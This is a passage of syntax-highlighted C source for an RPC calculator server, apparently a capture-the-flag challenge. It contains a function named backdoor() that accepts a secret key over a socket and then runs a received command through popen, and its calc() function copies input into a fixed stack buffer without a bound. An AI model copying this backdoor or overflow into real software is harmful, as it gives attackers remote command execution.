class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">deal_data</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> array<span class="token punctuation">,</span> stack<span class="token operator">*</span> opt<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> c <span class="token operator">=</span> opt<span class="token operator">-></span>pool<span class="token punctuation">[</span>opt<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    opt<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> a <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    array<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> b <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">-</span> a<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">/</span> a<span class="token punctuation">;</span>            <span class="token keyword">else</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>temp<span class="token punctuation">,</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> dest<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        stack opt<span class="token punctuation">;</span>        stack array<span class="token punctuation">;</span>    <span class="token punctuation">}</span> var<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> tmp <span class="token operator">=</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>BUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span>tmp<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">input_pass</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  str <span class="token operator">=</span> var<span class="token punctuation">.</span>buf<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size<span class="token punctuation">)</span>   <span class="token punctuation">{</span>    temp <span class="token operator">=</span> var<span class="token punctuation">.</span>dest<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>        temp<span class="token operator">++</span><span class="token punctuation">;</span>        str<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token function">myatoi</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> <span class="token function">priority</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">!=</span> <span class="token string">')'</span><span class="token punctuation">)</span>                                    <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">deal_data</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> <span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    str<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">"%lld"</span><span class="token punctuation">,</span> var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> packet <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"RPCN"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"\x00\x00\xbe\xf2"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> packet<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">magiccmp</span><span class="token punctuation">(</span>byte b1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> byte b2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">36</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>    k<span class="token operator">+</span><span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">bytecmp</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">int</span> sock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">!=</span><span class="token number">36</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bytecmp</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>EVIL_INS<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> cmd_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>cmd_len<span class="token operator">></span><span class="token number">22</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>cmd<span class="token punctuation">,</span> cmd_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token function">fgets</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">pclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockConn<span class="token punctuation">,</span> MQ mq<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> starting <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> error_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf0"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> done_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xef"</span><span class="token punctuation">;</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">magiccmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>RECV_MAGIC<span class="token punctuation">)</span><span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> length <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> packet_type <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> key_len<span class="token punctuation">,</span> id_len<span class="token punctuation">,</span> expr_len<span class="token punctuation">,</span> res_len<span class="token punctuation">,</span> status<span class="token punctuation">,</span> i<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token 